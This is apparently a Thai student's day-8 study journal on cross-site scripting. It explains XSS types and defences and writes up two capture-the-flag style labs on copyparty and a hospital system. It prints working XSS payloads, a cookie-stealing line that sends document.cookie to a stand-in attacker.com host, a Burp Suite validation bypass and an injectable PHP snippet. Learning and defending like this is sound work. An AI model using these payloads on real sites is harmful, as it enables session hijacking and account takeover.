# Day 8 — XSS (Cross-Site Scripting)

---

## สิ่งที่เรียนวันนี้

XSS = Cross-Site Scripting แนวคิดหลักคือการฉีด JavaScript เข้าไปในหน้าเว็บไซต์ เพื่อให้ browser ของเหยื่อทำการรัน code ที่ต้องการ

XSS ต่างจาก SQLi ยังไง

- **SQLi** คือรูปแบบการโจมตี server / database เป็นหลัก (back-end)
- **XSS** คือรูปแบบการโจมตี browser ของ user เป็นหลัก (front-end)

โดยที่ทั้ง XSS และ SQLi มี root cause เดียวกันคือ **unsanitized input** แต่เป้าหมายคนละส่วนกัน

---

## 3 ประเภทของ XSS

- **Reflected XSS** คือการส่ง payload ไป server ก่อนจากนั้นสะท้อนกลับมาทันที โดยที่ไม่เก็บข้อมูลลงใน Database
- **Stored XSS** คือการส่ง payload ไปยัง server และเก็บข้อมูลลงใน database ก่อน เพื่อโจมตีทุกคนที่เปิดหน้าเว็บนั้นๆ
- **DOM-based XSS** (Document Object Model) คือการใช้ช่องโหว่จากโครงสร้างของหน้าเว็บที่ browser สร้างขึ้นมาจาก HTML ในการโจมตี โดยที่ DOM-based นั้นคือ payload ที่ไม่เคยถูกส่งไปยัง server จะทำงานอยู่ใน layer ของฝั่ง client เท่านั้น

อธิบายง่ายๆ คือ

- **Reflected** เสมือนการส่งสปายไปที่ศูนย์ใหญ่เป้าหมาย เพื่อที่จะสามารถโจมตีเป้าหมายหลัก โดยการหลอกให้เป้าหมายเดินมาในเส้นทางที่วางแผนไว้
- **Stored** เสมือนการส่งสปายไปที่ศูนย์ใหญ่เป้าหมาย เพื่อที่จะสามารถดักซุ่มโจมตีใครก็ตามที่ผ่านเส้นทางนั้น
- **DOM-based** เสมือนการส่งสปายไปโจมตีเป้าหมายหลักโดยตรง โดยที่ไม่ต้องไปที่ศูนย์ใหญ่ของเป้าหมาย

---

## วิธีป้องกัน XSS

การป้องกัน XSS ทั้งหมด สามารถป้องกันได้โดยการแบ่งการแก้ไขออกเป็น 2 ส่วนหลักๆ

### 1. ฝั่ง Server หรือ Back-end

หน้าที่หลักคือการทำ output encoding ก่อนส่งข้อมูลกลับไปแสดงผล โดยใช้หลักการแปลงตัวอักษรพิเศษ เช่น `<` แปลงเป็น `&lt;` ทำให้ฝั่ง Client หรือ Front-end มองเห็นเป็นข้อความธรรมดา ไม่ใช่ HTML tag

อธิบายสั้นๆ คือฝั่ง server ควรทำการ sanitize ข้อมูลก่อนส่งกลับไปยัง client

### 2. ฝั่ง Client หรือ Front-end

หน้าที่หลักคือการเลือกใช้ method ที่ปลอดภัย เช่น เลือกใช้ `textContent` ทดแทน `innerHTML` เพื่อให้สามารถใส่ค่าเป็นข้อความได้เท่านั้น ไม่ Render เป็น HTML

และควรมีการกำหนด CSP (Content Security Policy) header เพื่อบอก browser ว่า JavaScript จากแหล่งไหนที่อนุญาตให้รัน เพื่อจำกัดว่า JavaScript จากแหล่งที่ปลอดภัยเท่านั้น (คล้ายหลักการอนุญาตตามข้อมูลที่กำหนดเท่านั้น)

### Layer เสริมเพิ่มเติม

ควรมีการกำหนด `HttpOnly` flag บน session cookie ส่งผลทำให้ JavaScript อ่าน `document.cookie` ไม่ได้ เพื่อให้แม้มี XSS หลุดรอดมาได้แต่ก็ไม่สามารถขโมย session ได้ (ในกรณีนี้ไม่ใช่ root fix แต่เป็นการลดความเสียหายที่เกิดขึ้น)

---

## สรุป 2 Challenge ที่ทำ

### Challenge: Reflected XSS lab (copyparty CVE-2023-38501)

การนำ URL ที่มี exploit ไปวางใน browser แล้วทดสอบการทำงาน

ตัวอย่าง: `http://MACHINE_IP:3923?k304=y%0D%0A%0D%0A%3Cimg+src%3Dcopyparty+onerror%3Dalert(1)%3E`

โดยโครงสร้าง exploit คือ:

```html
<img src=copyparty onerror=alert(1)>
```

หลักการคือ ใส่ `src` ที่ไม่มีอยู่จริง (`copyparty` ไม่ใช่ URL รูปภาพ) จากนั้น browser ทำการโหลดรูปแต่จะโหลดไม่ได้ trigger `onerror` event แล้วรัน `alert(1)` เทคนิคนี้เรียกว่า filter bypass — ในบางระบบจะทำการบล็อก `<script>` tag แต่ไม่ได้บล็อก `<img>` tag ส่งผลทำให้สามารถฉีด JavaScript ได้ผ่าน event handler อย่าง `onerror`

---

### Challenge: Stored XSS lab (Hospital Management System CVE-2021-38757)

ทำการ session hijacking

โดยโครงสร้าง exploit คือ:

```html
<script>alert(document.cookie)</script>
```

การส่ง exploit เข้าไปยัง server ผ่านส่วน message ในหน้า Contact ของเว็บไซต์ payload ถูกเก็บลง database โดยไม่ sanitize เมื่อ Receptionist login เข้ามาในระบบ ระบบจะทำการดึง message จาก database มาแสดงให้กับ browser รัน script แสดง cookie ออกมา ผลลัพธ์ที่ได้ attacker จะได้รับ session cookie ที่สามารถนำไปใช้ login เป็น Account Receptionist ได้โดยไม่ต้องรู้ password

โดยหากเป็นการโจมตีจริง attacker จะไม่ใช้ `alert()` แต่จะส่ง cookie นี้ไปหาตัวเองแทน

ตัวอย่าง:

```html
<script>new Image().src="http://attacker.com/steal?c="+document.cookie</script>
```

---

## จุดที่เข้าใจผิดและต้องแก้ไข

### 1. DOM-based XSS คิดว่าเป็น Man-in-the-Middle

**เข้าใจผิด:** คิดว่า DOM-based คือการแทรกอยู่ตรงกลางระหว่าง Client กับ Server เนื่องจากลักษณะการทำงานที่ payload ไม่เคยถูกส่งไปถึง server ทุกอย่างเกิดขึ้นใน browser ฝั่ง client ล้วนๆ

**ที่ถูกต้อง:** DOM-based ทำงานใน browser ฝั่ง client ล้วนๆ ไม่เกี่ยวกับการดักข้อมูลระหว่างทาง (MitM)

### 2. XSS payload คิดว่าต้องมี `#` นำหน้าเสมอ

**เข้าใจผิด:** เขียน payload เป็น `#<script>alert(1)</script>` เพราะเข้าใจว่าหลังโดเมน ต้องใส่ `#` ก่อนใส่ payload

**ที่ถูกต้อง:** `#` เป็นแค่ส่วนหนึ่งของ URL ที่ใช้ในกรณี DOM-based เท่านั้น ตัว payload จริงคือ `<script>alert(1)</script>`

### 3. การข้าม filter คิดว่าใช้ `<<` `>>` ซ้อน 2 ชั้น

**เข้าใจผิด:** คิดว่าถ้า filter บล็อก `<` `>` ให้ใส่ซ้อน 2 ชั้น เพื่อ bypass filter เพราะเข้าใจว่า หน้าเว็บมี JavaScript validation ที่บล็อกตัวอักษร `<` และ `>` ไม่ให้พิมพ์ จะยังฉีด payload ได้

**ที่ถูกต้อง:** วิธีข้าม JavaScript validation ไม่ใช่การใส่ `<<` `>>` ซ้อน 2 ชั้น เพราะ browser จะมองเป็น HTML tag ที่ผิด syntax ทั้งคู่ วิธีข้ามคือ:

- **Burp Suite** → intercept request แล้วแก้ payload ใน body ก่อน forward ไป server โดย JavaScript validation ไม่ได้รันตอนส่งผ่าน Burp
- **แก้ URL ตรงๆ** → ถ้าเป็น GET request ใส่ payload ใน URL parameter ได้เลย

หลักการคือ **client-side validation = UX เท่านั้น ไม่ใช่ security**

### 4. Reflected XSS คิดว่าป้องกันได้แค่ฝั่ง client

**เข้าใจผิด:** คิดว่า server ป้องกันได้แค่ Stored XSS เพราะ Stored XSS เกี่ยวข้องกับ server โดยตรงมีการเขียนข้อมูลลง Database ทำงานร่วมกับ Database

**ที่ถูกต้อง:** Reflected XSS ก็ป้องกันฝั่ง server ได้ เพราะ payload ผ่าน server ก่อนสะท้อนกลับมา โดยฝั่ง server ควรทำการ sanitize ข้อมูลก่อนส่งกลับไปยัง client

### 5. `textContent` คิดว่าเป็นการ sanitize

**เข้าใจผิด:** คิดว่า `textContent` ลบ tag อันตรายออกทั้งหมด เพราะคิดว่าหลักการคล้าย `sanitizeHtml()` ของภาษา Node.js

**ที่ถูกต้อง:** `textContent` คือ safe rendering method ที่บอก browser ให้แสดงผลเป็นข้อความเท่านั้น ไม่ render เป็น HTML และไม่ได้ลบอะไร

### 6. คิดว่า Developer ฝั่ง client คือผู้ใช้งานหรือ browser

**เข้าใจผิด:** สับสนว่าใครเป็นคนเขียน JavaScript ฝั่ง client เพราะเข้าใจว่าแบ่งฝั่ง Server คือทั้งหมดที่เก็บใน server ฝั่ง client คือ UX/UI เท่านั้น

**ที่ถูกต้อง:** Developer ที่สร้างเว็บเป็นคนรับผิดชอบเลือกใช้ method ที่ปลอดภัย ทั้งฝั่ง Server หรือ Back-end และฝั่ง Client หรือ Front-end

---

## Lesson สำคัญที่สุดของวันนี้

วันนี้เป็นเรื่องที่ใหม่มาก ใหม่แทบทุกอย่าง แต่รู้ว่ามีความรู้จาก SQLi จากเมื่อ 7 วันก่อนมาต่อยอด เพราะลักษณะช่องโหว่มีความคล้ายคลึงกันใน Concept แต่อาจจะแตกต่างกันในเรื่องของกระบวนการทำงาน และได้แก้ไขเรื่องที่เข้าใจผิดอย่าง ฝั่ง server และ ฝั่ง client โดยปกติแล้วการทำงานจะอยู่ในฝั่ง server หรือ Operations เป็นหลักไม่ได้ศึกษาด้านของ Developer ใน Layer Application มากนัก และในส่วนของ XSS อย่าง Reflected ในตอนแรกไม่เข้าใจคำว่าสะท้อน สะท้อนยังไง แล้ว server ไม่เก็บข้อมูลได้ยังไงในเมื่อถูกส่งไปที่ server ก็ได้เข้าใจมากขึ้น และ Stored, DOM-based ก็เช่นกัน

- **code เดียวมีช่องโหว่ได้ทั้ง XSS และ SQLi พร้อมกัน** — root cause เดียวกันคือ unsanitized input + string concatenation

ตัวอย่าง:

```php
$comment = $_POST['comment'];
mysqli_query($conn, "INSERT INTO comments (comment) VALUES ('$comment')");
```

นั่นทำให้เห็นภาพว่าการออกแบบให้ใช้งานได้ กับการออกแบบให้ดีนั้นต่างกันมากเพียงใด และผลกระทบที่เกิดขึ้นนั้นสามารถสร้างช่องโหว่ได้มากกว่า 1 ช่องโหว่

- **defence in depth คือสิ่งสำคัญ** — การป้องกันแค่อย่างใดอย่างหนึ่งนั้นไม่เพียงพอ หากป้องกันทั้งตอนเก็บ (sanitize) และไม่ป้องกันตอนแสดงผล (escape) ก็ยังมีโอกาสที่จะเกิดช่องโหว่ได้ การทำงานควบคู่กันนั้นเป็นสิ่งที่ควรจะเป็น และการเพิ่ม Layer เสริมเพื่อเป็นกันชนอีกชั้นของระบบก็ไม่เสียหาย:
  - ป้องกันตอนเก็บ (sanitize)
  - ป้องกันตอนแสดงผล (escape)
  - Layer เสริม: กำหนด `HttpOnly` flag

- **HTML tags เป็นสิ่งที่ควรให้ความสำคัญ** — Challenge Reflected XSS lab (copyparty CVE-2023-38501) ทำให้เห็นว่า แม้ระบบจะทำการบล็อก `<script>` tag แต่ไม่ได้บล็อก `<img>` tag ก็สามารถเกิดช่องโหว่ได้เช่นกัน

---

*Day 8 Complete — ต่อไป: Day 9*
